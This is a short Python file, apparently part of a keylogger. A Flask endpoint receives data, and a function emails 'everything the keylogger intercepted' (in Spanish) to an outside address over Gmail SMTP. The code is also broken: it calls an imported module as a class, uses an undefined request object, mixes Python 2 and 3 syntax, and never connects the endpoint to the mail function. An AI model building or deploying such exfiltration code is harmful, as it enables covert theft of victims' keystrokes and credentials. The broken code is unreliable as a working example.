import os
from dotenv import load_dotenv

load_dotenv()

from email.message import EmailMessage
import ssl
import smtplib

import flask as Flask

email_sender = 'mymailera@gmail.com'
email_password = os.getenv('APP_PASSWORD')


def send_email(mail, correo):

  email_receiver = 'xxxx@mail.com'
  subject = "Info del keylogger"
  body = f"El keylogger interceptó todo esto: {mail}"

  em = EmailMessage()

  em['from'] = email_sender
  em['To'] = email_receiver
  em['subject'] = subject
  em.set_content(body)

  context = ssl.create_default_context()

  with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
    smtp.login(email_sender, email_password)
    smtp.sendmail(email_sender, email_receiver, em.as_string())





app = Flask(__name__)

@app.route('/enviar', methods=['POST'])
def enviar():
  input_json = request.get_json(force=True) 
  # force=True, above, is necessary if another developer 
  # forgot to set the MIME type to 'application/json'
  print 'data from client:', input_json
  #dictToReturn = {'answer':42}
  #return jsonify(dictToReturn)



if __name__ == '__main__':
  app.run(debug=True, port=4040)